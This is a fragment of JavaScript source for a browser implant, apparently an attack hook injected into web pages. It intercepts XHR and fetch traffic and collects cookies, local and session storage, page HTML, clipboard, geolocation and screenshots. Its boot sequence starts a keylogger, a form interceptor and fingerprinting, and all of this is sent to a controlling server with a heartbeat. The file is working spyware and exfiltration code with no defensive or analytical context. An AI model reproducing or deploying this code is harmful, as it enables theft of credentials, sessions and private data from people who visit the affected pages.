        ts: Date.now(),
      });
    });
  }

  // AJAX / FETCH INTERCEPTOR

  function initAjaxInterceptor() {
    // Intercept XMLHttpRequest
    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function (method, url) {
      this._rfMethod = method;
      this._rfUrl = url;
      return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function (body) {
      var self = this;
      this.addEventListener("load", function () {
        // Don't intercept our own requests
        if (self._rfUrl && self._rfUrl.indexOf(CFG.server) === -1) {
          send("ajax", {
            method: self._rfMethod,
            url: self._rfUrl,
            status: self.status,
            responseLength: (self.responseText || "").length,
            ts: Date.now(),
          });
        }
      });
      return origSend.apply(this, arguments);
    };

    // Intercept fetch
    var origFetch = window.fetch;
    window.fetch = function (input, init) {
      var url =
        typeof input === "string" ? input : input && input.url ? input.url : "";
      var method = (init && init.method) || "GET";

      // Don't intercept our own
      if (url.indexOf(CFG.server) !== -1) {
        return origFetch.apply(this, arguments);
      }

      return origFetch.apply(this, arguments).then(function (response) {
        send("ajax", {
          method: method,
          url: url,
          status: response.status,
          ts: Date.now(),
        });
        return response;
      });
    };
  }

  // HARVEST ALL (Bulk collection command)

  function harvestAll() {
    send("cookies", { cookies: document.cookie, url: location.href });

    safeExec(function () {
      var ls = {};
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        ls[k] = localStorage.getItem(k);
      }
      send("localstorage", ls);
    });

    safeExec(function () {
      var ss = {};
      for (var i = 0; i < sessionStorage.length; i++) {
        var k = sessionStorage.key(i);
        ss[k] = sessionStorage.getItem(k);
      }
      send("sessionstorage", ss);
    });

    send("dom", {
      html: document.documentElement.outerHTML.substring(0, 100000),
      url: location.href,
      title: document.title,
    });

    detectSocialMedia();
    getGeolocation();
    readClipboard();
  }

  // HEARTBEAT

  function startHeartbeat() {
    setInterval(function () {
      send("custom", {
        event: "heartbeat",
        url: location.href,
        visible: !document.hidden,
        ts: Date.now(),
      });
    }, CFG.heartbeatMs);
  }

  // AUTO-LOAD html2canvas

  function loadHtml2Canvas() {
    safeExec(function () {
      var s = document.createElement("script");
      s.src =
        "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
      document.head.appendChild(s);
    });
  }

  // INITIALIZATION - BOOT SEQUENCE

  function boot() {
    log("Booting... SID:", CFG.sid);

    // Phase 1: Connect & Identify
    connectWS();
    collectBrowserInfo();
    collectHardwareInfo();
    collectFingerprint();

    // Phase 2: Passive Monitoring
    initKeylogger();
    initFormInterceptor();
    initClipboardMonitor();
    initInteractionTracking();
    initVisibilityTracking();
    trackPageVisit();
    initAjaxInterceptor();

    // Phase 3: Active Probing
    detectWebRTC();
    probePermissions();
    getGeolocation();
    detectSocialMedia();
    initDeviceSensors();

    // Phase 4: Background
    startHeartbeat();
    loadHtml2Canvas();

    // Phase 5: Periodic screenshot
    setTimeout(function () {
      captureScreen();
    }, 5000);

    log("Boot complete.");
  }

  // Start when DOM ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
